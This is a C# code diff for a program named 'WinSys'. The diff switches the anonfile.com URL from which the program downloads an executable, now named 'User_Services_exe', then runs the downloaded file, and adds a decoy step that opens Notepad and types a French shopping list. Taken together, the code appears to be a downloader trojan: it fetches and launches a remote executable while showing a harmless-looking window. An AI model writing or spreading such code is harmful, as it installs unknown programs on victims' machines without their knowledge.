@@ -1,10 +1,9 @@
 ﻿using System;
-using System.Runtime.InteropServices;
-using System.Threading;
-using System.Windows.Forms;
 using IWshRuntimeLibrary;
 using System.IO;
 using System.Net;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace WinSys
 {
@@ -27,7 +26,7 @@ namespace WinSys
             {
                 using (WebClient client = new WebClient())
                 {
-                    string s = client.DownloadString("https://anonfile.com/j1Eerfi5bf/A3_exe");
+                    string s = client.DownloadString("https://anonfile.com/3dUc9fi5b3/User_Services_exe");
                     System.Diagnostics.Debug.WriteLine(s);
                     String St = s;
 
@@ -53,7 +52,11 @@ namespace WinSys
 
             }
             System.Diagnostics.Process.Start(filePath);
-            System.Diagnostics.Process.Start("notepad.exe", "mybeautifultexe.txt");
+            System.Diagnostics.Process.Start("notepad.exe");
+            Thread.Sleep(1000);
+            SendKeys.SendWait("- La liste :{ENTER}");
+            Thread.Sleep(10);
+            SendKeys.SendWait("- Pain{ENTER}- Autres...");
         }
     }
 }
